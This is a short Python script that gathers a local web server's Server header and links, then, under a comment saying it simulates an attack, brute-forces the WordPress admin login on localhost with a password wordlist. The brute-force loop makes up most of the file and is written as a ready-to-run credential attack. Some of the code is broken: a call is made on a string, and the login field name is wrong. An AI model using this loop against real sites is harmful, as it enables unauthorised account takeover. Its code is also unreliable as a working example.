import requests
from bs4 import BeautifulSoup

req = requests.get("http://127.0.0.1")
sw = req.headers["Server"]
content = req.content

soup =  BeautifulSoup(req.text, "html.parser").prettify()

soup2 = BeautifulSoup(content, "html.parser").prettify()
images = soup2.find_all("a", href=True)
images_list = []

for image in images:
    images_list.append(image["href"])

images_set = set(images_list)

# Simlating Attack
word_p = requests.get("http://localhost/wp-admin")
soup_word_p = BeautifulSoup(word_p.text, "html.parser")

passfile = "passwords.txt"
with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        attempt = requests.post("http://localhost/wp-login.php", data={"log": "admin", "password": word})

        if "ERROR" not in attempt.text:
            print("Password is" + word)
